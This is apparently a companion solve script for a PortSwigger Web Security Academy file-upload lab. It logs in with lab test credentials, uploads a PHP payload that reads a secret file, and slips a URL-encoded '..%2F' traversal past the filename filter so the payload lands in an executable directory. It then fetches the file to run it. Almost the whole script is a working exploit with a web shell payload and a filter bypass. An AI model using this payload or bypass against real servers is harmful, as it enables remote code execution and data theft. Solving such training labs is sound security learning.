#!/usr/bin/env python3
"""
Web shell upload via path traversal
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 03-web-shell-upload-via-path-traversal.md

What this does:
    Logs in, confirms a plain "../exploit.php" filename gets its traversal
    stripped (the server saves it as avatars/exploit.php), then re-uploads
    with the slash URL-encoded -- filename="..%2Fexploit.php" -- so the
    traversal filter, which only checks for literal "../", never sees it.
    The server decodes the filename *after* that check and writes the file
    to /files/exploit.php, one directory above the non-executing avatars/
    folder. Fetches it from there to trigger execution and read the secret.

Usage:
    python 03-web-shell-upload-via-path-traversal.py <lab-url>
    e.g. python 03-web-shell-upload-via-path-traversal.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

PHP_SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def _upload(client: httpx.Client, base: str, filename: str) -> httpx.Response:
    csrf = _get_csrf(client, f"{base}/my-account")
    return client.post(f"{base}/my-account/avatar",
                       files={"avatar": (filename, PHP_SHELL.encode(), "application/x-php")},
                       data={"csrf": csrf, "user": "wiener"})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    # Confirm the naive "../" gets stripped -- our recon step, not the bypass itself.
    r_stripped = _upload(client, lab_url, "../exploit.php")
    print(f"[*] Plain '../' traversal upload: {r_stripped.status_code} -- "
          f"response mentions: {r_stripped.text[:150]!r}")

    # Bypass: URL-encode the slash so the raw-string filter never sees "../".
    r = _upload(client, lab_url, "..%2Fexploit.php")
    print(f"[*] Encoded '..%2F' traversal upload: {r.status_code}")

    file_url = f"{lab_url}/files/exploit.php"
    fetched = client.get(file_url)
    secret = fetched.text.strip()
    print(f"[*] Fetched {file_url} -- body: {secret[:200]!r}")

    if not secret or "<?php" in secret:
        print("[-] File did not execute -- no secret recovered")
        return

    print(f"[+] Secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
